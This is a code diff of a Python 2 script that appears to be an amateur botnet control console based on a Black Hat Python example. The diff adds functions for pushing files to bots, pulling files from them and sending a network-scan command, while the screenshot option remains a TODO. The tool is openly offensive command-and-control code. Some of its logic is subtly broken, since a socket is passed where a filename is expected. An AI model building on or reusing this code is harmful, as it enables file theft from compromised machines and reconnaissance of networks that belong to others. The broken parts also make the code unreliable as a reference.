@@ -2,18 +2,20 @@ import socket
 import threading
 from xml.dom import minidom
 
+bind_host = '0.0.0.0'
+bind_port = 9990
+
+send_host = '127.0.0.1'
+send_port = 6660
 
 # ---------- TCP Server ---------- #
 # Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
-# TCP server to accept messages from bot, runs as a thread.
-
-bind_ip = '0.0.0.0'
-bind_port = 9999
+# TCP server to accept messages from bot, runs as a thread
 
 # Create the socket to listen on for TCP, set the IP and port (0.0.0.0 means any I think?)
 # 5 is max backlogged connections
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((bind_ip, bind_port))
+server.bind((bind_host, bind_port))
 server.listen(5)
 
 
@@ -23,8 +25,9 @@ def handle_client(client_socket):
     request = client_socket.recv(1024)  # 1024 is the buffer size
 
     print("\n[*--> Received: %s" % request)
+    if request == '[*-->file_recv':
+        get_file(client_socket)
 
-    client_socket.send("GOT IT")  # SEND A TEST PACKET BACK
     client_socket.close()
 
 
@@ -121,49 +124,61 @@ def menu():
     return choice
 
 
-def send_cmd(cmd, target_host):
+def send_cmd(cmd):
     # Sends a command to a bot, invoked from other functions who's end result is pushing a command
-
-    target_port = 6660
 
     # create a socket object
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # connect the client
-    client.connect((target_host, target_port))
+    client.connect((send_host, send_port))
 
     # send some data
     client.send(cmd)
 
 
-def handle_cmd():
-    # TODO MAKE THIS SHIT WORK
-    print('')
-
-
 def send_file(the_file):
-    # Handles the sending of files
-
-    target_host = '127.0.0.1'
-    target_port = 6660
-
-    # Create a socket, and connection
     client = socket.socket()
-    client.connect((target_host, target_port))
+    client.connect((send_host, send_port))
 
-    target_file = open(the_file, 'rb')
-    read = target_file.read(1024)
-    print('Sending')
+    client.send('[*-->file_recv')
 
-    while read:
-        print('Sending...')
-        client.send(read)
-        read = target_file.read(1024)
+    if client.recv(1024) == '[*-->ok':
+        client.send(the_file)
 
-    print "Sending Complete"
+    if client.recv(1024) == '[*-->ok':
+        target_file = open(the_file, 'rb')
+        file_stream = target_file.read(1024)
+        while file_stream:
+            print('Sending...')
+            client.send(file_stream)
+            file_stream = target_file.read(1024)
+
     client.shutdown(socket.SHUT_WR)
     client.close()
 
+
+def get_file(the_file):
+    client = socket.socket()
+    client.connect((send_host, send_port))
+    client.send('[*-->file_deliv')
+
+    if client.recv(1024) == '[*-->ok':
+        client.send(the_file)
+
+    if client.recv(1024) == '[*-->ok':
+        client.send('[*-->start')
+        print ("Receiving...")
+        the_file = 'FUCK' + the_file
+        recv_file = open(the_file, 'wb')
+        file_stream = client.recv(1024)
+
+        while file_stream:
+            print ("Receiving...")
+            recv_file.write(file_stream)
+            file_stream = client.recv(1024)
+
+        print('File Get')
 
 
 # ---------- END FUNCTIONS ---------- #
@@ -210,7 +225,7 @@ print("     ********************************************************************
 
 
 # ---------- ITEM SELECTION TREE ---------- #
-print("\n[*--> Listening on %s:%d\n" % (bind_ip, bind_port))
+print("\n[*--> Listening on %s:%d\n" % (bind_host, bind_port))
 
 
 while True:
@@ -220,19 +235,19 @@ while True:
         view_bots()
 
     elif select == 1:  # Send File
-        print('function 1')
-        # TODO MAKE THIS WORK
+        file_to_send = raw_input('The File >>> ')
+        send_file(file_to_send)
 
     elif select == 2:  # Get File
-        print('function 2')
-        # TODO MAKE THIS WORK
+        file_to_get = raw_input('The File >>> ')
+        get_file(file_to_get)
 
     elif select == 3:  # Tell bot to Screen Shot
         print('function 3')
         # TODO MAKE THIS WORK
 
     elif select == 4:  # Tell bot to Scan network
-        print('function 4')
+        send_cmd('[*-->ping')
         # TODO MAKE THIS WORK
 
     elif select == 5:  # Exit the Script
